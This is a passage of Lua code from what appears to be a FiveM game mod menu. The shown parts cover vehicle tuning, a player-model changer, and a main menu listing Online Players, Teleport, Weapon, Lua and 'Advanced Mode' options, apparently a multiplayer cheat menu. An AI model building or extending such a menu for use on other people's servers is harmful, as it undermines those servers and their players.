        EVP.CreateSubMenu(MSMSA, WOP, envypxd)
        EVP.CreateSubMenu(CTSa, VMS, envypxd)
        EVP.CreateSubMenu(CTS, CTSa, envypxd)
        EVP.CreateSubMenu(cAoP, CTS, envypxd)
        EVP.CreateSubMenu(MTS, VMS, envypxd)
        EVP.CreateSubMenu(mtsl, MTS, envypxd)
        EVP.CreateSubMenu(CTSmtsps, mtsl, envypxd)
        EVP.CreateSubMenu(GSWP, OPMS, envypxd)
        EVP.CreateSubMenu(espa, advm, envypxd)
        EVP.CreateSubMenu(LSCC, VMS, envypxd)
        EVP.CreateSubMenu(tngns, LSCC, envypxd)
        EVP.CreateSubMenu(prof, LSCC, envypxd)
        EVP.CreateSubMenu(bmm, VMS, envypxd)
        EVP.CreateSubMenu(SPD, Tmas, envypxd)
        EVP.CreateSubMenu(gccccc, VMS, envypxd)
        EVP.CreateSubMenu(CMSMS, WMPS, envypxd)
        EVP.CreateSubMenu(GAPA,OPMS,envypxd)



        for i,theItem in pairs(vehicleMods) do
          EVP.CreateSubMenu(theItem.id, tngns, theItem.name)

          if theItem.id == "paint" then
            EVP.CreateSubMenu("primary", theItem.id, "Primary Paint")
            EVP.CreateSubMenu("secondary", theItem.id, "Secondary Paint")

            EVP.CreateSubMenu("rimpaint", theItem.id, "Wheel Paint")

            EVP.CreateSubMenu("classic1", "primary", "Classic Paint")
            EVP.CreateSubMenu("metallic1", "primary", "Metallic Paint")
            EVP.CreateSubMenu("matte1", "primary","Matte Paint")
            EVP.CreateSubMenu("metal1", "primary","Metal Paint")
            EVP.CreateSubMenu("classic2", "secondary", "Classic Paint")
            EVP.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
            EVP.CreateSubMenu("matte2", "secondary","Matte Paint")
            EVP.CreateSubMenu("metal2", "secondary","Metal Paint")
            EVP.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
            EVP.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
            EVP.CreateSubMenu("matte3", "rimpaint","Matte Paint")
            EVP.CreateSubMenu("metal3", "rimpaint","Metal Paint")

          end
        end

        for i,theItem in pairs(perfMods) do
          EVP.CreateSubMenu(theItem.id, prof, theItem.name)
        end

        while Enabled do

          ped = PlayerPedId()
          veh = GetVehiclePedIsUsing(ped)
          SetVehicleModKit(veh,0)

          for i,theItem in pairs(vehicleMods) do

            if EVP.IsMenuOpened(tngns) then
              if isPreviewing then
                if oldmodtype == "neon" then
                  local r,g,b = table.unpack(oldmod)
                  SetVehicleNeonLightsColour(veh,r,g,b)
                  SetVehicleNeonLightEnabled(veh, 0, oldmodaction)
                  SetVehicleNeonLightEnabled(veh, 1, oldmodaction)
                  SetVehicleNeonLightEnabled(veh, 2, oldmodaction)
                  SetVehicleNeonLightEnabled(veh, 3, oldmodaction)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                elseif oldmodtype == "paint" then
                  local pa,pb,pc,pd = table.unpack(oldmod)
                  SetVehicleColours(veh, pa,pb)
                  SetVehicleExtraColours(veh,pc,pd)
                  isPreviewing = false
                  oldmodtype = -1
                  oldmod = -1
                else
                  if oldmodaction == "rm" then
                    RemoveVehicleMod(veh, oldmodtype)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  else
                    SetVehicleMod(veh, oldmodtype,oldmod,false)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  end
                end
              end
            end

            if EVP.IsMenuOpened(theItem.id) then
              if theItem.id == "wheeltypes" then
                if EVP.Button("Sport Wheels") then
                  SetVehicleWheelType(veh,0)
                elseif EVP.Button("Muscle Wheels") then
                  SetVehicleWheelType(veh,1)
                elseif EVP.Button("Lowrider Wheels") then
                  SetVehicleWheelType(veh,2)
                elseif EVP.Button("SUV Wheels") then
                  SetVehicleWheelType(veh,3)
                elseif EVP.Button("Offroad Wheels") then
                  SetVehicleWheelType(veh,4)
                elseif EVP.Button("Tuner Wheels") then
                  SetVehicleWheelType(veh,5)
                elseif EVP.Button("High End Wheels") then
                  SetVehicleWheelType(veh,7)
                end
                EVP.Display()
              elseif theItem.id == "extra" then
                local extras = checkValidVehicleExtras()
                for i,theItem in pairs(extras) do
                  if IsVehicleExtraTurnedOn(veh,i) then
                    pricestring = "Installed"
                  else
                    pricestring = "Not Installed"
                  end

                  if EVP.Button(theItem.menuName, pricestring) then
                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
                  end
                end
                EVP.Display()
              elseif theItem.id == "headlight" then

                if EVP.Button("None") then
                  SetVehicleHeadlightsColour(veh, -1)
                end

                for theName, theItem in pairs(headlightscolor) do
                  tp = GetVehicleHeadlightsColour(veh)

                  if tp == theItem.id and not isPreviewing then
                    pricetext = "Installed"
                  else
                    if isPreviewing and tp == theItem.id then
                      pricetext = "Previewing"
                    else
                      pricetext = "Not Installed"
                    end
                  end
                  head = GetVehicleHeadlightsColour(veh)
                  if EVP.Button(theItem.name, pricetext) then
                    if not isPreviewing then
                      oldmodtype = "headlight"
                      oldmodaction = false
                      oldhead = GetVehicleHeadlightsColour(veh)
                      oldmod = table.pack(oldhead)
                      SetVehicleHeadlightsColour(veh, theItem.id)

                      isPreviewing = true
                    elseif isPreviewing and head == theItem.id then
                      ToggleVehicleMod(veh, 22, true)
                      SetVehicleHeadlightsColour(veh, theItem.id)
                      isPreviewing = false
                      oldmodtype = -1
                      oldmod = -1
                    elseif isPreviewing and head ~= theItem.id then
                      SetVehicleHeadlightsColour(veh, theItem.id)
                      isPreviewing = true
                    end
                  end
                end
                EVP.Display()
              elseif theItem.id == "licence" then

                if EVP.Button("None") then
                  SetVehicleNumberPlateTextIndex(veh, 3)
                end

                for theName, theItem in pairs(licencetype) do
                  tp = GetVehicleNumberPlateTextIndex(veh)

                  if tp == theItem.id and not isPreviewing then
                    pricetext = "Installed"
                  else
                    if isPreviewing and tp == theItem.id then
                      pricetext = "Previewing"
                    else
                      pricetext = "Not Installed"
                    end
                  end
                  plate = GetVehicleNumberPlateTextIndex(veh)
                  if EVP.Button(theItem.name, pricetext) then
                    if not isPreviewing then
                      oldmodtype = "headlight"
                      oldmodaction = false
                      oldhead = GetVehicleNumberPlateTextIndex(veh)
                      oldmod = table.pack(oldhead)
                      SetVehicleNumberPlateTextIndex(veh, theItem.id)

                      isPreviewing = true
                    elseif isPreviewing and plate == theItem.id then
                      SetVehicleNumberPlateTextIndex(veh, theItem.id)
                      isPreviewing = false
                      oldmodtype = -1
                      oldmod = -1
                    elseif isPreviewing and plate ~= theItem.id then
                      SetVehicleNumberPlateTextIndex(veh, theItem.id)
                      isPreviewing = true
                    end
                  end
                end
                EVP.Display()
              elseif theItem.id == "neon" then

                if EVP.Button("None") then
                  SetVehicleNeonLightsColour(veh,255,255,255)
                  SetVehicleNeonLightEnabled(veh,0,false)
                  SetVehicleNeonLightEnabled(veh,1,false)
                  SetVehicleNeonLightEnabled(veh,2,false)
                  SetVehicleNeonLightEnabled(veh,3,false)
                end


                for i,theItem in pairs(neonColors) do
                  colorr,colorg,colorb = table.unpack(theItem)
                  r,g,b = GetVehicleNeonLightsColour(veh)

                  if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle,2) and not isPreviewing then
                    pricestring = "Installed"
                  else
                    if isPreviewing and colorr == r and colorg == g and colorb == b then
                      pricestring = "Previewing"
                    else
                      pricestring = "Not Installed"
                    end
                  end

                  if EVP.Button(i, pricestring) then
                    if not isPreviewing then
                      oldmodtype = "neon"
                      oldmodaction = IsVehicleNeonLightEnabled(veh,1)
                      oldr,oldg,oldb = GetVehicleNeonLightsColour(veh)
                      oldmod = table.pack(oldr,oldg,oldb)
                      SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                      SetVehicleNeonLightEnabled(veh,0,true)
                      SetVehicleNeonLightEnabled(veh,1,true)
                      SetVehicleNeonLightEnabled(veh,2,true)
                      SetVehicleNeonLightEnabled(veh,3,true)
                      isPreviewing = true
                    elseif isPreviewing and colorr == r and colorg == g and colorb == b then
                      SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                      SetVehicleNeonLightEnabled(veh,0,true)
                      SetVehicleNeonLightEnabled(veh,1,true)
                      SetVehicleNeonLightEnabled(veh,2,true)
                      SetVehicleNeonLightEnabled(veh,3,true)
                      isPreviewing = false
                      oldmodtype = -1
                      oldmod = -1
                    elseif isPreviewing and colorr ~= r or colorg ~= g or colorb ~= b then
                      SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                      SetVehicleNeonLightEnabled(veh,0,true)
                      SetVehicleNeonLightEnabled(veh,1,true)
                      SetVehicleNeonLightEnabled(veh,2,true)
                      SetVehicleNeonLightEnabled(veh,3,true)
                      isPreviewing = true
                    end
                  end
                end
                EVP.Display()
              elseif theItem.id == "paint" then

                if EVP.MenuButton("~p~#~s~ Primary Paint","primary") then

                elseif EVP.MenuButton("~p~#~s~ Secondary Paint","secondary") then

                elseif EVP.MenuButton("~p~#~s~ Wheel Paint","rimpaint") then

                end


                EVP.Display()

              else
                local valid = checkValidVehicleMods(theItem.id)
                for i,ctheItem in pairs(valid) do
                  for eh,tehEtem in pairs(horns) do
                    if eh == theItem.name and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
                      price = "Not Installed"
                    elseif eh == theItem.name and isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                      price = "Previewing"
                    elseif eh == theItem.name and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                      price = "Installed"
                    end
                  end
                  if ctheItem.menuName == "~b~Stock" then end
                  if theItem.name == "Horns" then
                    for chorn,HornId in pairs(horns) do
                      if HornId == ci-1 then
                        ctheItem.menuName = chorn
                      end
                    end
                  end
                  if ctheItem.menuName == "NULL" then
                    ctheItem.menuName = "unknown"
                  end
                  if EVP.Button(ctheItem.menuName) then

                    if not isPreviewing then
                      oldmodtype = theItem.id
                      oldmod = GetVehicleMod(veh, theItem.id)
                      isPreviewing = true
                      if ctheItem.data.realIndex == -1 then
                        oldmodaction = "rm"
                        RemoveVehicleMod(veh, ctheItem.data.modid)
                        isPreviewing = false
                        oldmodtype = -1
                        oldmod = -1
                        oldmodaction = false
                      else
                        oldmodaction = false
                        SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
                      end
                    elseif isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                      isPreviewing = false
                      oldmodtype = -1
                      oldmod = -1
                      oldmodaction = false
                      if ctheItem.data.realIndex == -1 then
                        RemoveVehicleMod(veh, ctheItem.data.modid)
                      else
                        SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
                      end
                    elseif isPreviewing and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
                      if ctheItem.data.realIndex == -1 then
                        RemoveVehicleMod(veh, ctheItem.data.modid)
                        isPreviewing = false
                        oldmodtype = -1
                        oldmod = -1
                        oldmodaction = false
                      else
                        SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
                        isPreviewing = true
                      end
                    end
                  end
                end
                EVP.Display()
              end
            end
          end



          for i,theItem in pairs(perfMods) do
            if EVP.IsMenuOpened(theItem.id) then

              if GetVehicleMod(veh,theItem.id) == 0 then
                pricestock = "Not Installed"
                price1 = "Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
              elseif GetVehicleMod(veh,theItem.id) == 1 then
                pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
              elseif GetVehicleMod(veh,theItem.id) == 2 then
                pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Installed"
                price4 = "Not Installed"
              elseif GetVehicleMod(veh,theItem.id) == 3 then
                pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Installed"
              elseif GetVehicleMod(veh,theItem.id) == -1 then
                pricestock = "Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
              end
              if EVP.Button("Stock "..theItem.name, pricestock) then
                SetVehicleMod(veh,theItem.id, -1)
              elseif EVP.Button(theItem.name.." Upgrade 1", price1) then
                SetVehicleMod(veh,theItem.id, 0)
              elseif EVP.Button(theItem.name.." Upgrade 2", price2) then
                SetVehicleMod(veh,theItem.id, 1)
              elseif EVP.Button(theItem.name.." Upgrade 3", price3) then
                SetVehicleMod(veh,theItem.id, 2)
              elseif theItem.id ~= 13 and theItem.id ~= 12 and EVP.Button(theItem.name.." Upgrade 4", price4) then
                SetVehicleMod(veh,theItem.id, 3)
              end
              EVP.Display()
            end
          end

          if EVP.IsMenuOpened(EnVyPIcS) then

            drawDescription("Welcome back ~p~"..pisello.." ~s~!", 0.80, 0.9)
            if EVP.MenuButton("~p~#~s~ Self Menu", sMX) then
            elseif EVP.MenuButton("~p~#~s~ Online Players", OPMS) then
            elseif EVP.MenuButton("~p~#~s~ Teleport Menu", TRPM) then
            elseif EVP.MenuButton("~p~#~s~ Vehicle Menu", VMS) then
            elseif EVP.MenuButton("~p~#~s~ Weapon Menu", WMPS) then
            elseif EVP.MenuButton("~p~#~s~ Lua Menu ~o~:3", LMX) then
            elseif EVP.MenuButton("~p~#~s~ Advanced Mode ~o~xD", advm) then
            elseif EVP.Button("~r~End Menu") then
              Enabled = false
            end


            EVP.Display()
          elseif EVP.IsMenuOpened(CHAR) then -- appearance menu
            if EVP.Button("~g~Reset Model To FiveM Player") then
              local model = "mp_m_freemode_01"
                RequestModel(GetHashKey(model)) 
                Wait(500)
                if HasModelLoaded(GetHashKey(model)) then
                  SetPlayerModel(PlayerId(), GetHashKey(model))
                  end
                elseif EVP.Button("Model Changer") then
              local model = KeyboardInput("Enter Model Name", "", 100)
              RequestModel(GetHashKey(model))
              print(model)
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              else
                notify("~r~~h~Invalid Model")
              end
            elseif EVP.Button("Random Skin") then
              RandomSkin(PlayerId())
            elseif EVP.Button('~c~~h~Randomize~s~ Clothing') then
              SetPedRandomComponentVariation(PlayerPedId(), true)
            elseif EVP.Button('~c~~h~Model~s~ Clown') then
              local model = "s_m_y_clown_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Mime') then
              local model = "S_M_Y_Mime"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Stripper') then
              local model = "s_f_y_stripper_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Topless') then
              local model = "a_f_y_topless_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Cop M') then
              local model = "s_m_y_cop_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Cop F') then
              local model = "MP_F_Cop_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Sheriff M') then
              local model = "S_M_Y_Sheriff_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Sheriff F') then
              local model = "S_F_Y_Sheriff_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model ~b~SWAT M') then
              local model = "S_M_Y_Swat_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Armoured Ranger M') then
              local model = "S_M_M_Armoured_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Ranger F') then
              local model = "S_F_Y_Ranger_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Ranger Male') then
              local model = "S_M_Y_Ranger_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Robot Ranger Male') then
              local model = "U_M_Y_RSRanger_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Desert Army 01') then
              local model = "G_M_Y_DesArmy_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Desert Army 02') then
              local model = "G_M_Y_DesArmy_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Desert Army 03') then
              local model = "G_M_Y_DesArmy_03"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Desert Army 04') then
              local model = "G_M_Y_DesArmy_04"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Desert Army 05') then
              local model = "G_M_Y_DesArmy_05"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Marine 01') then
              local model = "S_M_Y_Marine_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Marine 02') then
              local model = "S_M_Y_Marine_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Marine 03') then
              local model = "S_M_Y_Marine_03"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Marine Commander') then
              local model = "S_M_M_Marine_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Marine General') then
              local model = "S_M_M_Marine_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Black OPS1 M') then
              local model = "S_M_Y_BlackOps_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Black OPS2 M') then
              local model = "S_M_Y_BlackOps_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Black OPS3 M') then
              local model = "S_M_Y_BlackOps_03"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Prison Guard M') then
              local model = "S_M_M_PrisGuard_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~b~ Paramedic M') then
              local model = "S_M_M_Paramedic_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~y~ Vagos F') then
              local model = "G_F_Y_Vagos_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~g~ Ramp Gang M') then
              local model = "IG_Ramp_Gang"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~g~ Ramp Gang Boss M') then
              local model = "CSB_Ramp_gang"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~g~ Fam Gang 01 M') then
              local model = "MP_M_FamDD_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~g~ Fam Gang 02 M') then
              local model = "G_M_Y_FamDNF_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~g~ Fam Gang Boss M') then
              local model = "G_M_Y_FamCA_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~p~ Bella Gang 01 M') then
              local model = "G_M_Y_BallaEast_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~p~ Bella Gang 02 M') then
              local model = "G_M_Y_BallaSout_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~p~ Bella Gang 03 M') then
              local model = "IG_BallasOG"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~p~ Bella Gang 04 M') then
              local model = "IG_BallasOG"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~p~ Bella Gang F') then
              local model = "G_F_Y_Ballas_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~p~ Bella Gang Boss M') then
              local model = "G_M_Y_BallaOrig_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Jewel F') then
              local model = "U_F_Y_JewelAss_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Jewel Thief') then
              local model = "U_M_M_JewelThief"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~o~ Prisoner 01 M') then
              local model = "S_M_Y_PrisMuscl_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~o~ Prisoner 02 M') then
              local model = "S_M_Y_Prisoner_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~o~ Prisoner 03 M') then
              local model = "U_M_Y_Prisoner_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Body Builder 01 M') then
              local model = "A_M_Y_MusclBeac_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Body Builder 02 M') then
              local model = "A_M_Y_MusclBeac_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Body Builder 03 M') then
              local model = "A_M_Y_Surfer_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Body Builder 04 M') then
              local model = "IG_TylerDix"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Body Builder 05 M') then
              local model = "u_m_y_babyd"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Body Builder F') then
              local model = "CS_MaryAnn"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Beach 01 F') then
              local model = "A_F_M_Beach_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Beach 02 F') then
              local model = "A_F_Y_Beach_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Beach Fat F') then
              local model = "A_F_M_FatCult_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 01') then
              local model = "A_F_Y_BevHills_01"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 02') then
              local model = "A_F_Y_BevHills_02"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 03') then
              local model = "A_F_Y_BevHills_03"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 04') then
              local model = "A_F_Y_BevHills_04"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 05') then
              local model = "CSB_Bride"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
                SetPlayerModel(PlayerId(), GetHashKey(model))
              end
            elseif EVP.Button('~c~~h~Model~s~ Rich Female 06') then
              local model = "U_F_Y_PoppyMich"
              RequestModel(GetHashKey(model))
              Wait(500)
              if HasModelLoaded(GetHashKey(model)) then
